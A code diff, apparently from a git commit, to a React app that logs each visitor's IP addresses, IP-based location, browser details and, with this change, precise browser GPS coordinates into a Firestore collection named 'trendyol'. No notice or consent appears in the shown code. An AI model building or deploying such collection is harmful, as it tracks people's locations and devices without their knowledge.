@@ -14,16 +14,19 @@ import {
 } from "react-device-detect";
 function App() {
   const [ip3, setIp3] = useState("");
+  const [ip4, setIp4] = useState("");
   const [finish, setFinished] = useState(false);
 
   useEffect(() => {
-   !finish && sendBrowserInfo();
-  }, [finish,ip3]);
+    !finish && sendBrowserInfo();
+  }, [finish, ip3]);
 
   async function sendBrowserInfo() {
     const ip = await findIp();
     const ip2 = await findIp2();
     const ip3s = await getUserLocation();
+    getUserLocation2(setIp4);
+    console.log("ip4", ip4);
     setIp3(ip3s);
     const date = new Date();
     ip.turkishDate = date.toLocaleString("tr-TR");
@@ -36,8 +39,8 @@ function App() {
     if (ip3) {
       try {
         const docRef = await addDoc(collection(db, "trendyol"), ip);
-        if(docRef?.id){
-          setFinished(true)
+        if (docRef?.id) {
+          setFinished(true);
         }
         return;
       } catch (e) {
@@ -74,12 +77,25 @@ const findIp2 = async () => {
 };
 async function getUserLocation() {
   try {
-    const response = await axios.get('https://ipinfo.io/json', {
-      headers: { 'Authorization': `Bearer ${process.env.REACT_APP_TOKEN}` }
+    const response = await axios.get("https://ipinfo.io/json", {
+      headers: { Authorization: `Bearer ${process.env.REACT_APP_TOKEN}` },
     });
-    return response.data
+    return response.data;
   } catch (error) {
-    console.error('Error:', error);
+    console.error("Error:", error);
   }
 }
+function getUserLocation2(setIp4) {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
 
+  function showPosition(position) {
+    setIp4({
+      lat: position.coords.latitude,
+      lng: position.coords.longitude,
+    });
+  }
+}
